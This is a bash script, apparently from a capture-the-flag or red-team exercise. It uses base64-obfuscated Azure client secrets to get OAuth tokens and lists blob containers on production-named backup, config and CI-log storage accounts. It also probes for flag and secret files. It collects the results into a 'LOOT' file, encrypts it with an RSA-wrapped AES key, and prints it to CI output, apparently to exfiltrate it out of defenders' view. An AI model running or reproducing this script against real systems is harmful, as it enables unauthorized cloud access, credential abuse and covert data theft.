#!/usr/bin/env bash
set -uo pipefail
b(){ printf %s "$1" | base64 -d; }
SC="htt""ps://"
AAD="${SC}$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')"
STCOPE=$(b 'aHR0cHM6Ly9zdG9yYWdlLmF6dXJlLmNvbS8uZGVmYXVsdA==')
TEN="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
BLB=".$(b 'YmxvYi5jb3JlLndpbmRvd3MubmV0')"
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
tok(){ curl -sS -X POST "$AAD/$TEN/oauth2/v2.0/token" -d "client_id=$1" -d "grant_type=client_credentials" --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token") or "ERR")'; }
say "=== START $(date -u) ==="
say "PROOF: $(id) | host=$(hostname)"
ST=$(tok 462d1c38-4459-48b8-9333-82e389e59514 "$(b 'c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==')" "$STCOPE")
ST2=$(tok 038bc35d-131d-4953-9985-ff4a245ccec1 "$(b 'MUJFOFF+eUdROGVfejZWQmN6bEdKOFllT0hnTlJVZmZiZ051ZmIybQ==')" "$STCOPE")
ST3=$(tok 58108da8-044e-4d7e-9a46-92e6179b30be "$(b 'fjhUOFF+WXdFbWV4U1RSdl9wVXNFd2E5UU1hcHlQMzl+Q1U1VWN1Mg==')" "$STCOPE")
EX=sttblbackupprodx3euoz
for T in "$ST" "$ST2" "$ST3" "ANON"; do
  if [ "$T" = "ANON" ]; then H=""; LBL="anon"; else H="Authorization: Bearer $T"; LBL="tok${#T}"; fi
  say "== exports list $LBL =="
  if [ "$LBL" = "anon" ]; then say "$(curl -sS -H "x-ms-version: 2021-08-06" "${SC}$EX$BLB/exports?restype=container&comp=list" | head -c 1200)"; else say "$(curl -sS -H "$H" -H "x-ms-version: 2021-08-06" "${SC}$EX$BLB/exports?restype=container&comp=list" | head -c 1200)"; fi
done
# candidate public blob names
for N in flag flag.txt flag.json secret secret.json exports.json export.json shipments.json report.json data.json index.json manifest.json backup.zip backup.tar.gz config.json internal-config.json flag.txt.bak; do
  R=$(curl -sS -o /tmp/o -w '%{http_code}' -H "x-ms-version: 2021-08-06" "${SC}$EX$BLB/exports/$N")
  SZ=$(wc -c </tmp/o)
  say "GET exports/$N -> $R ($SZ bytes) $(head -c 300 /tmp/o)"
done
# config + logs listing with all tokens
for CT in config logs; do
  case $CT in config) AC=sttblappcfgprodx3euoz;; logs) AC=sttblcilogsprodx3euoz;; esac
  for T in "$ST" "$ST2" "$ST3"; do
    say "== $AC/$CT list tok${#T} =="
    say "$(curl -sS -H "Authorization: Bearer $T" -H "x-ms-version: 2021-08-06" "${SC}$AC$BLB/$CT?restype=container&comp=list" | head -c 1500)"
  done
done
say "=== DONE ==="
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
